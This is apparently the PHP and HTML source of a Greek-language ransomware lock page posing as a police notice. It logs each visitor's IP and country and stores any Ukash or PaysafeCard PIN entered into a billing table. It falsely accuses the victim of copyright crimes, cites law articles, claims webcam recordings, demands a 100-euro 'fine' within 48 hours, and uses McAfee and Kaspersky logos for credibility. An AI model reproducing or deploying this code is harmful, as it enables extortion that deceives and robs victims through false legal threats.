<?php
error_reporting(0);
include 'include/config.php';
include ('include/db.php');
include("sxgeo/SxGeo.php");




$pin=$_GET['pin'];
$ip = $_SERVER['REMOTE_ADDR'];
$date=date('H:i:s j/m/Y');


$SxGeo = new SxGeo();

$country=$SxGeo->get_cc($ip);

$SxGeo->close();


$locations= array(1 => 'DE', 'UK', 'IT', 'FR', 'ES', 'PT', 'CA', 'AT', 'FI', 'SE', 'US', 'GR', 'LU', 'BE', 'PL');

foreach ($locations as $value)
{
	
if ($value==$country)
{
$pic=$value;
break;
}
else
$pic='default';	
}




mysql_query ( "INSERT INTO checklist (ip, country, date) VALUES ('".mysql_escape_string($ip)."', 
'".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
mysql_insert_id ();




  $pin=$_GET['pin'];

  
  
    if(strlen($pin) == 16 && preg_match("/[0-9]{16}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
   if(strlen($pin) == 19 && preg_match("/[0-9]{19}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
  
 
 ?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>


  
  <script language="JavaScript">
<!--
///////////////////////////////////
function clickIE4(){
if (event.button==2){
return false;
}
}
function clickNS4(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
return false;
}
}
}
if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}
document.oncontextmenu=new Function("return false")
// --> </script>
  

  
  <title></title>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1251">


  
  <link href="style.css" rel="stylesheet" type="text/css">


  
  <script type="text/javascript" src="jquery1.3.1.js"></script>
  
  <script type="text/javascript" src="jquerykeypad.js"></script>
  

  
  <style type="text/css">
<!--
#Table_01 {
position:absolute;
left:20px;
top:20px;
width:100%;
height:100%;
}
.btn{
color: #000;
width: 30px;
margin-left: 5px;
border: 1px solid #434343;
-moz-border-radius: 2px;
-khtml-border-radius: 2px;
-webkit-border-radius: 2px;
border-radius: 2px;
}
.btn:hover{
border: 2px solid #0290CB;
}
#Untitled-1-01 {
position:absolute;
left:0px;
top:0px;
width:1024px;
height:98px;
}
#Untitled-1-02 {
position:absolute;
left:0px;
top:98px;
width:395px;
height:670px;
}
#Untitled-1-03 {
position:absolute;
left:395px;
top:98px;
width:324px;
height:430px;
}
#Untitled-1-04 {
position:absolute;
left:719px;
top:98px;
width:305px;
height:430px;
}
#Untitled-1-05 {
position:absolute;
left:395px;
top:528px;
width:629px;
height:240px;
}
-->
  </style><!-- End ImageReady Styles -->
</head>


<body style="margin: 0px; background-color: rgb(255, 255, 255);">


<!-- ImageReady Slices (Untitled-1) -->
<div id="Table_01">
<div id="Untitled-1-01"> <img style="width: 481px; height: 99px;" alt="" src="images/logo.jpg"></div>


<div style="left: 0px; width: 470px; top: 130px; height: 803px;" id="Untitled-1-02"><span id="result_box" class="" lang="el"><span class="hps">&#908;&lambda;&eta; &eta; &delta;&rho;&alpha;&sigma;&tau;&eta;&rho;&iota;&#972;&tau;&eta;&tau;&alpha;</span> <span class="hps">&alpha;&upsilon;&tau;&omicron;&#973; &tau;&omicron;&upsilon; &upsilon;&pi;&omicron;&lambda;&omicron;&gamma;&iota;&sigma;&tau;&#942;</span> <span class="hps">&#941;&chi;&epsilon;&iota; &kappa;&alpha;&tau;&alpha;&gamma;&rho;&alpha;&phi;&epsilon;&#943;</span><span>.</span> <span class="hps">&Epsilon;&#940;&nu;</span> <span class="hps">&chi;&rho;&eta;&sigma;&iota;&mu;&omicron;&pi;&omicron;&iota;&epsilon;&#943;&tau;&epsilon;
&tau;&eta;&nu; &kappa;&#940;&mu;&epsilon;&rho;&alpha;
&delta;&iota;&alpha;&delta;&iota;&kappa;&tau;&#973;&omicron;&upsilon;</span><span>,</span> <span class="hps">&beta;&#943;&nu;&tau;&epsilon;&omicron;</span> <span class="hps">&kappa;&alpha;&iota;</span> <span class="hps">&epsilon;&iota;&kappa;&#972;&nu;&epsilon;&sigmaf;</span> <span class="hps">&sigma;&#974;&theta;&eta;&kappa;&alpha;&nu;</span> <span class="hps">&kappa;&#940;&mu;&epsilon;&rho;&alpha;</span> <span class="hps">&gamma;&iota;&alpha;</span> <span class="hps">&alpha;&nu;&alpha;&gamma;&nu;&#974;&rho;&iota;&sigma;&eta;</span><span class="">.</span></span>

<center><img style="width: 256px; height: 192px;" alt="" src="images/flag_256.jpg"></center>


<br>


<span style="font-weight: bold;" id="result_box" class="" lang="el"><span class="hps">&Delta;&iota;&epsilon;&#973;&theta;&upsilon;&nu;&sigma;&eta; IP &sigma;&alpha;&sigmaf;</span><span class="">:</span></span><?php echo $_SERVER['REMOTE_ADDR'];?>
<br>
<span id="result_box" class="" lang="el"><span class="hps">&Mu;&pi;&omicron;&rho;&epsilon;&#943;&tau;&epsilon;</span> <span class="hps">&nu;&alpha;
&pi;&rho;&omicron;&sigma;&delta;&iota;&omicron;&rho;&#943;&zeta;&omicron;&nu;&tau;&alpha;&iota;
&sigma;&alpha;&phi;&#974;&sigmaf;</span> <span class="hps">&alpha;&pi;&#972; &tau;&eta;&nu; IP</span> <span class="hps">&delta;&iota;&epsilon;&#973;&theta;&upsilon;&nu;&sigma;&eta;</span> <span class="hps">&sigma;&alpha;&sigmaf;</span> <span class="hps">&kappa;&alpha;&iota;</span> <span class="hps">&tau;&omicron; &sigma;&chi;&epsilon;&tau;&iota;&kappa;&#972;</span> <span class="hps">&#972;&nu;&omicron;&mu;&alpha;</span></span><br>


<br>


<img style="width: 447px; height: 90px;" alt="" src="images/yourpclock.jpg"><br>


<br>


<span id="result_box" class="" lang="el"><span style="font-weight: bold;" class="hps">&Kappa;&alpha;&tau;&epsilon;&beta;&#940;&sigma;&epsilon;&iota;</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">&pi;&alpha;&rho;&#940;&nu;&omicron;&mu;&alpha;</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">&upsilon;&lambda;&iota;&kappa;&#972;</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps atn">(</span><span style="font-weight: bold;">MP3, </span><span style="font-weight: bold;" class="hps">&tau;&alpha;&iota;&nu;&#943;&epsilon;&sigmaf;</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">&#942;</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">&lambda;&omicron;&gamma;&iota;&sigma;&mu;&iota;&kappa;&#972;</span><span style="font-weight: bold;">), </span> <span style="font-weight: bold;" class="hps">&#941;&chi;&epsilon;&iota; &epsilon;&nu;&tau;&omicron;&pi;&iota;&sigma;&tau;&epsilon;&#943;&sigma;&tau;&omicron;&nu; &upsilon;&pi;&omicron;&lambda;&omicron;&gamma;&iota;&sigma;&tau;&#942;</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">&sigma;&alpha;&sigmaf;</span><br>
<br>
 <span class="hps">&Mu;&epsilon; &tau;&eta; &lambda;&#942;&psi;&eta;</span><span>,</span> <span class="hps">&pi;&omicron;&upsilon;</span> <span class="hps">&epsilon;&#943;&chi;&alpha;&nu;</span> <span class="hps">&alpha;&nu;&alpha;&pi;&alpha;&rho;&alpha;&chi;&theta;&epsilon;&#943;</span><span>,</span> <span class="hps">&gamma;&epsilon;&gamma;&omicron;&nu;&#972;&sigmaf;
&pi;&omicron;&upsilon; &theta;&alpha;
&sigma;&upsilon;&nu;&epsilon;&pi;&alpha;&gamma;&#972;&tau;&alpha;&nu;</span> <span class="hps">&#941;&nu;&alpha;</span> <span class="hps">&pi;&omicron;&iota;&nu;&iota;&kappa;&#972; &alpha;&delta;&#943;&kappa;&eta;&mu;&alpha;</span> <span class="hps">&sigma;&#973;&mu;&phi;&omega;&nu;&alpha; &mu;&epsilon; &tau;&omicron; &#940;&rho;&theta;&rho;&omicron;</span> <span class="hps">106 &tau;&omicron;&upsilon;</span> <span class="hps">&nu;&#972;&mu;&omicron;&upsilon;
&pi;&epsilon;&rho;&#943;
&pi;&nu;&epsilon;&upsilon;&mu;&alpha;&tau;&iota;&kappa;&#974;&nu;
&delta;&iota;&kappa;&alpha;&iota;&omega;&mu;&#940;&tau;&omega;&nu;</span><span>.</span><br>
<br>
 <span class="hps">&Eta; &lambda;&#942;&psi;&eta;</span> <span class="hps">&tau;&omicron;&upsilon;</span> <span class="hps">&pi;&nu;&epsilon;&upsilon;&mu;&alpha;&tau;&iota;&kappa;&#940;
&kappa;&alpha;&tau;&omicron;&chi;&upsilon;&rho;&omega;&mu;&#941;&nu;&omicron;&upsilon;
&upsilon;&lambda;&iota;&kappa;&omicron;&#973;</span> <span class="hps">&mu;&#941;&sigma;&omega; &tau;&omicron;&upsilon; &Delta;&iota;&alpha;&delta;&iota;&kappa;&tau;&#973;&omicron;&upsilon;</span> <span class="hps">&#942;</span> <span class="hps">&delta;&iota;&kappa;&tau;&#973;&omega;&nu;</span> <span class="hps">&alpha;&nu;&tau;&alpha;&lambda;&lambda;&alpha;&gamma;&#942;&sigmaf;</span> <span class="hps">&mu;&omicron;&upsilon;&sigma;&iota;&kappa;&#942;&sigmaf;</span> <span class="hps">&epsilon;&#943;&nu;&alpha;&iota; &pi;&alpha;&rho;&#940;&nu;&omicron;&mu;&eta;</span> <span class="hps">&kappa;&alpha;&iota;</span> <span class="hps">&epsilon;&#943;&nu;&alpha;&iota;</span> <span class="hps">&sigma;&#973;&mu;&phi;&omega;&nu;&alpha;</span> <span class="hps">&mu;&epsilon;</span><br>
 <span class="hps">&Tau;&omicron; &tau;&mu;&#942;&mu;&alpha;</span> <span class="hps">106 &tau;&omicron;&upsilon;</span> <span class="hps">&nu;&#972;&mu;&omicron;&upsilon;
&pi;&epsilon;&rho;&#943;
&pi;&nu;&epsilon;&upsilon;&mu;&alpha;&tau;&iota;&kappa;&#974;&nu;
&delta;&iota;&kappa;&alpha;&iota;&omega;&mu;&#940;&tau;&omega;&nu;</span> <span class="hps">&pi;&omicron;&upsilon; &upsilon;&pi;&#972;&kappa;&epsilon;&iota;&nu;&tau;&alpha;&iota;</span> <span class="hps">&sigma;&epsilon; &pi;&rho;&#972;&sigma;&tau;&iota;&mu;&omicron;</span> <span class="hps">&#942;</span> <span class="hps">&phi;&upsilon;&lambda;&#940;&kappa;&iota;&sigma;&eta;</span> <span class="hps">&gamma;&iota;&alpha;</span> <span class="hps">&mu;&iota;&alpha;</span> <span class="hps">&pi;&omicron;&iota;&nu;&#942;</span> <span class="hps">&mu;&#941;&chi;&rho;&iota; 3 &#941;&tau;&eta;</span><br>
<br>
 <span class="hps">&Epsilon;&pi;&#943;&sigma;&eta;&sigmaf;, &eta; &iota;&sigma;&chi;&upsilon;&rho;&#942;</span> <span class="hps">&kappa;&alpha;&tau;&omicron;&chi;&#942;</span> <span class="hps">&pi;&alpha;&rho;&#940;&nu;&omicron;&mu;&alpha;</span> <span class="hps">&lambda;&#942;&psi;&eta;</span> <span class="hps">&upsilon;&lambda;&iota;&kappa;&omicron;&#973; &tau;&iota;&mu;&omega;&rho;&omicron;&#973;&nu;&tau;&alpha;&iota;</span> <span class="hps">&sigma;&#973;&mu;&phi;&omega;&nu;&alpha; &mu;&epsilon; &tau;&omicron; &#940;&rho;&theta;&rho;&omicron;</span> <span class="hps">184</span> <span class="hps">&pi;&alpha;&rho;&#940;&gamma;&rho;&alpha;&phi;&omicron;&sigmaf;</span> <span class="hps">3 &tau;&omicron;&upsilon;</span> <span class="hps">&Pi;&omicron;&iota;&nu;&iota;&kappa;&omicron;&#973; &Kappa;&#974;&delta;&iota;&kappa;&alpha;</span> <span class="hps">&kappa;&alpha;&iota;</span> <span class="hps">&mu;&pi;&omicron;&rho;&epsilon;&#943;
&epsilon;&pi;&#943;&sigma;&eta;&sigmaf; &nu;&alpha;
&omicron;&delta;&eta;&gamma;&#942;&sigma;&epsilon;&iota;</span> <span class="hps">&sigma;&tau;&eta;&nu; &kappa;&alpha;&tau;&#940;&sigma;&chi;&epsilon;&sigma;&eta;</span> <span class="hps">&tau;&omicron;&upsilon;</span> <span class="hps">&upsilon;&pi;&omicron;&lambda;&omicron;&gamma;&iota;&sigma;&tau;&#942;</span><span>,</span> <span class="hps">&mu;&epsilon; &tau;&eta;&nu; &omicron;&pi;&omicron;&#943;&alpha;</span> <span class="hps">&omicron;&iota;</span> <span class="hps">&Delta;&#942;&lambda;&epsilon;&sigmaf;</span> <span class="hps">&epsilon;&#943;&chi;&alpha;&nu; &kappa;&alpha;&tau;&epsilon;&beta;&#940;&sigma;&epsilon;&iota;</span></span></div>


<div style="left: 474px; width: 372px; top: 128px; height: 174px;" id="Untitled-1-03"><span id="result_box" class="" lang="el"><span class="hps">&Pi;&alpha;&rho;&alpha;&kappa;&alpha;&lambda;&omicron;&#973;&mu;&epsilon;</span> <span class="hps">&alpha;&kappa;&omicron;&lambda;&omicron;&upsilon;&theta;&#942;&sigma;&tau;&epsilon;
&tau;&iota;&sigmaf; &omicron;&delta;&eta;&gamma;&#943;&epsilon;&sigmaf;</span> <span class="hps">&sigma;&chi;&epsilon;&tau;&iota;&kappa;&#940; &mu;&epsilon; &tau;&omicron; &delta;&iota;&kappa;&alpha;&#943;&omega;&mu;&alpha;</span></span>

<form name="ukash_form" method="get" action="GR.php" style="margin: 0px;">Ukash code: <input name="pin" id="defaultKeypad" type="text"><input name="formbutton1" value="ok" class="btn" type="submit">
  
  <div id="formradio2"><input name="100u" value="50" type="radio">50 Euro</div>


  
  <div id="formradio3"><input name="100u" value="100" checked="checked" type="radio">100
Euro</div>


</form>


<form name="psc_form" method="get" action="GR.php" style="margin: 0px;">Psc code: <input name="pin" id="defaultKeypad2" type="text"><input name="formbutton2" value="ok" class="btn" type="submit">
  
  <div id="formradio4"><input name="100p" value="50" type="radio">50 Euro</div>


  
  <div id="formradio5"><input name="100p" value="100" checked="checked" type="radio">100
Euro</div>


</form>


<br>


<br>


<br>


<span id="result_box" class="" lang="el"><span style="color: rgb(255, 0, 0);" class="hps">&Pi;&alpha;&rho;&alpha;&kappa;&alpha;&lambda;&#974; &sigma;&eta;&mu;&epsilon;&iota;&#974;&sigma;&tau;&epsilon;</span><span style="color: rgb(255, 0, 0);">:</span> <span class="hps">&Alpha;&upsilon;&tau;&#972; &tau;&omicron;</span> <span class="hps">&pi;&rho;&#972;&sigma;&tau;&iota;&mu;&omicron;</span> <span class="hps">&mu;&pi;&omicron;&rho;&epsilon;&#943; &nu;&alpha; &kappa;&alpha;&tau;&alpha;&beta;&lambda;&eta;&theta;&epsilon;&#943; &mu;&#972;&nu;&omicron;</span> <span class="hps">&mu;&#941;&sigma;&alpha; &sigma;&epsilon; 48 &#974;&rho;&epsilon;&sigmaf;</span><span>,</span> <span class="hps">&alpha;&nu;</span> <span class="hps">&alpha;&phi;&#942;&sigma;&omicron;&upsilon;&mu;&epsilon;</span> <span class="hps">&nu;&alpha; &pi;&epsilon;&rho;&#940;&sigma;&epsilon;&iota;</span> <span class="hps">48 &#974;&rho;&epsilon;&sigmaf;</span> <span class="hps">&chi;&omega;&rho;&#943;&sigmaf;</span> <span class="hps">&pi;&lambda;&eta;&rho;&omega;&mu;&#942;</span><span class="">,</span><br>
&nbsp; <span class="hps">&eta; &delta;&upsilon;&nu;&alpha;&tau;&#972;&tau;&eta;&tau;&alpha;</span> <span class="hps">&tau;&eta;&sigmaf; &alpha;&pi;&epsilon;&lambda;&epsilon;&upsilon;&theta;&#941;&rho;&omega;&sigma;&eta;&sigmaf;</span> <span class="hps">&tau;&omicron;&upsilon; &upsilon;&pi;&omicron;&lambda;&omicron;&gamma;&iota;&sigma;&tau;&#942;</span> <span class="hps">&sigma;&alpha;&sigmaf;</span> <span class="hps">&lambda;&#942;&gamma;&epsilon;&iota;</span><span>.</span><br>
<br>
 <span class="hps">&Sigma;&tau;&eta;&nu; &pi;&epsilon;&rho;&#943;&pi;&tau;&omega;&sigma;&eta; &alpha;&upsilon;&tau;&#942;,</span> <span class="hps">&eta; &pi;&omicron;&iota;&nu;&iota;&kappa;&#942;</span> <span class="hps">&upsilon;&pi;&#972;&theta;&epsilon;&sigma;&eta; &epsilon;&nu;&alpha;&nu;&tau;&#943;&omicron;&nu;</span> <span class="hps">&sigma;&alpha;&sigmaf;</span> <span class="hps">&theta;&alpha;</span> <span class="hps">&epsilon;&nu;&epsilon;&rho;&gamma;&omicron;&pi;&omicron;&iota;&eta;&theta;&epsilon;&#943;
&alpha;&upsilon;&tau;&#972;&mu;&alpha;&tau;&alpha;</span></span><span style="font-weight: bold;">.</span></div>


<div style="left: 860px; width: 164px; top: 98px; height: 261px;" id="Untitled-1-04"> <img style="width: 332px; height: 271px;" alt="" src="images/right2.jpg"></div>


<div style="left: 481px; width: 543px; top: 520px; height: 328px;" id="Untitled-1-05"> <img style="width: 276px; height: 38px;" alt="" src="images/mcafee.jpg"><span id="result_box" class="" lang="en"><span class="hps"><br>
</span></span><span id="result_box" class="" lang="el"><span style="font-weight: bold;" class="hps">&Pi;&#974;&sigmaf; &nu;&alpha;</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">&xi;&epsilon;&kappa;&lambda;&epsilon;&iota;&delta;&#974;&sigma;&epsilon;&tau;&epsilon;</span><span style="font-weight: bold;">;</span><br>
<br>
 <span class="hps">&Sigma;&#973;&mu;&phi;&omega;&nu;&alpha; &mu;&epsilon;</span> <span class="hps">&tau;&omicron; &nu;&#972;&mu;&omicron;</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps atn">"</span><span style="font-weight: bold;">&gamma;&iota;&alpha; &tau;&omicron;&nu; &#941;&lambda;&epsilon;&gamma;&chi;&omicron; &kappa;&alpha;&iota; </span><span style="font-weight: bold;" class="hps">&pi;&rho;&omicron;&sigma;&tau;&alpha;&sigma;&#943;&alpha;
&tau;&omega;&nu;
&pi;&lambda;&eta;&rho;&omicron;&phi;&omicron;&rho;&iota;&#974;&nu;&raquo;</span> <span class="hps">&sigma;&tau;&omicron;</span> <span class="hps">02/01/2012</span> <span class="hps">&Theta;&alpha; &pi;&rho;&#941;&pi;&epsilon;&iota; &nu;&alpha; &pi;&lambda;&eta;&rho;&#974;&sigma;&epsilon;&iota;</span> <span class="hps">&pi;&rho;&#972;&sigma;&tau;&iota;&mu;&omicron;</span> <span class="hps"><span style="font-weight: bold;">100 &epsilon;&upsilon;&rho;&#974;</span>.</span> <span class="hps">&Gamma;&iota;&alpha; &tau;&eta; &delta;&iota;&epsilon;&upsilon;&kappa;&#972;&lambda;&upsilon;&nu;&sigma;&eta;</span> <span class="hps">&tau;&eta;&sigmaf;</span> <span class="hps">&pi;&lambda;&eta;&rho;&omega;&mu;&#942;&sigmaf; &pi;&rho;&omicron;&sigma;&tau;&#943;&mu;&omicron;&upsilon;</span> <span class="hps">&pi;&rho;&omicron;&sigma;&phi;&omicron;&rho;&#940;</span> <span class="hps">&nu;&alpha;
&chi;&rho;&eta;&sigma;&iota;&mu;&omicron;&pi;&omicron;&iota;&#942;&sigma;&epsilon;&iota;
&mu;&iota;&alpha; &alpha;&sigma;&phi;&alpha;&lambda;&#942;</span> <span class="hps">&tau;&rho;&#972;&pi;&omicron; &pi;&lambda;&eta;&rho;&omega;&mu;&#942;&sigmaf;</span> <span class="hps">&mu;&#941;&sigma;&omega;</span> <span class="hps">&kappa;&omicron;&upsilon;&pi;&omicron;&nu;&iota;&#974;&nu;</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">Ukash</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">/</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">PaysafeCard</span><span style="font-weight: bold;">.</span> <span class="hps">&Theta;&alpha; &chi;&rho;&epsilon;&iota;&alpha;&sigma;&tau;&epsilon;&#943; &nu;&alpha;</span> <span class="hps">&alpha;&gamma;&omicron;&rho;&#940;&sigma;&epsilon;&tau;&epsilon;</span> <span class="hps">&kappa;&omicron;&upsilon;&pi;&#972;&nu;&iota;&alpha;</span> <span class="hps">&sigma;&tau;&omicron; &pi;&omicron;&sigma;&#972;</span> <span class="hps">&tau;&omega;&nu;</span> <span style="font-weight: bold;" class="hps">100 &epsilon;&upsilon;&rho;&#974;</span><span class="">,</span> <span class="hps">&mu;&epsilon;&tau;&#940;</span> <span class="hps">&nu;&alpha;
&sigma;&upsilon;&mu;&pi;&lambda;&eta;&rho;&#974;&sigma;&epsilon;&tau;&epsilon;
&tau;&alpha; &kappa;&alpha;&tau;&#940;&lambda;&lambda;&eta;&lambda;&alpha;</span> <span class="hps">&pi;&epsilon;&delta;&#943;&alpha;, &kappa;&#940;&nu;&tau;&epsilon; &kappa;&lambda;&iota;&kappa;</span> <span class="hps">&sigma;&tau;&omicron; "OK</span></span><span id="result_box" class="" lang="en"><span class="">"</span></span><br>


<br>


<center><img style="top: 666px; left: 501px; width: 169px; height: 90px;" alt="" src="images/1326914693-sopa-pipa-inquisitr.png">
<img style="top: 488px; left: 501px; width: 76px; height: 92px;" alt="" src="images/kaspersky_is_logo.gif.png"></center>


</div>


</div>


<!-- End ImageReady Slices -->
</body>
</html>
